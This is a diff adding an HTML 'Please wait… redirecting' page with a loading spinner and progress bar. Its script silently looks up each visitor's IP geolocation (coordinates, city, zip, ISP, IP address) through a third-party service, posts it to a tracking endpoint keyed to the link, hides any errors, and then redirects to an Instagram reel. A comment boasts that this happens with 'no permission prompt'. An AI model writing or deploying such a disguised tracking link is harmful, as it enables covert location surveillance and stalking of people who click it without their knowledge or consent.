@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting…</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', -apple-system, sans-serif;
+      background: #0a0a0f;
+      color: #e8e8f0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .bg-orbs {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .orb {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.4;
+      animation: float 8s ease-in-out infinite;
+    }
+
+    .orb-1 {
+      width: 300px; height: 300px;
+      background: rgba(108, 92, 231, 0.3);
+      top: 10%; left: 20%;
+    }
+
+    .orb-2 {
+      width: 250px; height: 250px;
+      background: rgba(0, 214, 143, 0.2);
+      bottom: 20%; right: 15%;
+      animation-delay: -3s;
+    }
+
+    .orb-3 {
+      width: 200px; height: 200px;
+      background: rgba(255, 169, 77, 0.2);
+      top: 60%; left: 10%;
+      animation-delay: -5s;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      33% { transform: translate(30px, -20px) scale(1.05); }
+      66% { transform: translate(-20px, 20px) scale(0.95); }
+    }
+
+    .card {
+      position: relative;
+      z-index: 1;
+      background: #12121a;
+      border: 1px solid #2a2a3d;
+      border-radius: 24px;
+      padding: 48px 40px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 80px rgba(0,0,0,0.5);
+    }
+
+    .loader {
+      width: 48px;
+      height: 48px;
+      border: 3px solid rgba(108, 92, 231, 0.2);
+      border-top-color: #6c5ce7;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 28px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .card h1 {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .card p {
+      font-size: 14px;
+      color: #8888a8;
+      line-height: 1.6;
+    }
+
+    .progress-bar {
+      height: 4px;
+      background: rgba(108, 92, 231, 0.15);
+      border-radius: 2px;
+      margin-top: 28px;
+      overflow: hidden;
+    }
+
+    .progress-bar .fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #6c5ce7, #00d68f);
+      border-radius: 2px;
+      transition: width 2s ease;
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-orbs">
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+  </div>
+
+  <div class="card">
+    <div class="loader"></div>
+    <h1>Please wait…</h1>
+    <p>You're being redirected. This will only take a moment.</p>
+    <div class="progress-bar"><div class="fill" id="fill"></div></div>
+  </div>
+
+  <script>
+    const trackId = window.location.pathname.split('/').pop();
+
+    // Start progress bar animation
+    setTimeout(() => document.getElementById('fill').style.width = '100%', 100);
+
+    // Silently grab location from IP — no permission prompt
+    (async () => {
+      try {
+        const res = await fetch('http://ip-api.com/json/?fields=lat,lon,city,regionName,country,isp,query,zip');
+        const data = await res.json();
+
+        await fetch(`/api/location/${trackId}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            lat: data.lat,
+            lng: data.lon,
+            city: data.city,
+            region: data.regionName,
+            country: data.country,
+            isp: data.isp,
+            ip: data.query,
+            zip: data.zip
+          })
+        });
+      } catch (e) {
+        // silently fail
+      }
+
+      // Redirect after a short delay
+      setTimeout(() => {
+        window.location.href = 'https://www.instagram.com/reel/DTCjYdtgjR9/?igsh=MTJhaG11aDY2aXBhdA==';
+      }, 2000);
+    })();
+  </script>
+</body>
+</html>
